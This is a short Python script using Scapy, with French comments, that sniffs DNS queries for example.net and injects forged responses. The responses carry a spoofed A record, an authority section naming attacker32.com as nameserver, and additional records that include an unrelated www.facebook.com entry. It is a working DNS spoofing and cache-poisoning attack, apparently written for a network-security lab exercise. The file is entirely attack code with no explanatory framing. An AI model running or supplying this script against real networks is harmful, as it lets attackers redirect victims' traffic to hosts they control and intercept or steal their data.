#!/usr/bin/python
from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and 'example.net' in pkt[DNS].qd.qname.decode()):

        # Inverser src et dst
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        # Answer Section
        Anssec = DNSRR(
            rrname=pkt[DNS].qd.qname,
            type='A',
            ttl=259200,
            rdata='10.99.46.220'
        )

        # Authority Section
        NSsec1 = DNSRR(
            rrname='example.net',
            type='NS',
            ttl=259200,
            rdata='attacker32.com'
        )
        NSsec2 = DNSRR(
            rrname='example.net',
            type='NS',
            ttl=259200,
            rdata='ns.example.net'
        )

        # Additional Section
        # Entrée 1 → liée au NS attacker32.com
        Addsec1 = DNSRR(
            rrname='attacker32.com',
            type='A',
            ttl=259200,
            rdata='1.2.3.4'
        )
        # Entrée 2 → liée au NS ns.example.net
        Addsec2 = DNSRR(
            rrname='ns.example.net',
            type='A',
            ttl=259200,
            rdata='5.6.7.8'
        )
        # Entrée 3 → pas liée du tout
        Addsec3 = DNSRR(
            rrname='www.facebook.com',
            type='A',
            ttl=259200,
            rdata='3.4.5.6'
        )

        # Construire le paquet DNS
        DNSpkt = DNS(
            id=pkt[DNS].id,
            qd=pkt[DNS].qd,
            aa=1, rd=0, qr=1,
            qdcount=1,
            ancount=1,
            nscount=2,
            arcount=3,
            an=Anssec,
            ns=NSsec1/NSsec2,
            ar=Addsec1/Addsec2/Addsec3
        )

        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
        print("Paquet spoofé envoyé !")

pkt = sniff(
    filter='udp and dst port 53',
    prn=spoof_dns
)